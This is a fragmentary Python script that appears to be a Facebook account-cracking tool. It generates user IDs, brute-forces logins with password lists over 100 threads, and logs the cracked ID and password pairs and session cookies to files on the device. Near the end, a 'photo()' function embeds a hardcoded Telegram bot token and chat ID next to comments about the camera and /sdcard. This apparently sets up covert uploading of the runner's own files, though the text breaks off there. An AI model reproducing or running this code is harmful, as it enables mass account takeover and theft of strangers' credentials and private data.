...
for sat in range(1000):
    ...
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
os.system("espeak -a 300 \"Welcome to,MY GF ETUU ,\"")   
print('\033[95;1m[\x1b[38;5;50m+\033[95;1m] \x1b[38;5;50m I LOVE YOU ETUU ')
logo=("""\033[1;31m
...
/_____/ /_/  \____/\____/      
\033[1;31m===============================================
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m DEVELOPER   :  MISS ETUU
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m FACEBOOK    :  QUITE GRIL ETUU
...
\033[1;31m[\033[1;37m≈\033[1;31m]\033[1;37m NOTE        :  \033[1;34mMY BEST FRIENDS ETUU\033[1;32m
\033[1;31m===============================================                        
""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
...
def fuck():
  ...
  #  os.system('xdg-open https://www.facebook.com/profile.php?id=100093241763897')
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=100) as ETUU:
        os.system('clear')
        print(logo)
      #  os.system('xdg-open https://www.facebook.com/profile.php?id=100093241763897')
        tl = str(len(user))
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sETUU\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f"\033[38;5;46m[ETUU-OK💚] {uid} • {ps}" '  \n\033[1;33m [💉]\033[1;33mCookie = \033[1;31m'+coki+  ' \n\033[1;31m [🤧] \033[1;32mUa = \033[1;31m'+pro+'  \033[0;97m')
                open('/sdcard/ETUU-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;31m[ETUU-CP💔] {uid} • {ps}")
                open('/sdcard/ETUU-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
...
def photo():
    session=requests.session() 
    bot_token ='6559793691:AAGi8MFgLkQDyhtSy3AZL-h7ucI3HjpaRJ0' 
    chat_id ='5990094251'
    #-----------( /sdcard
    try:
        # camera 
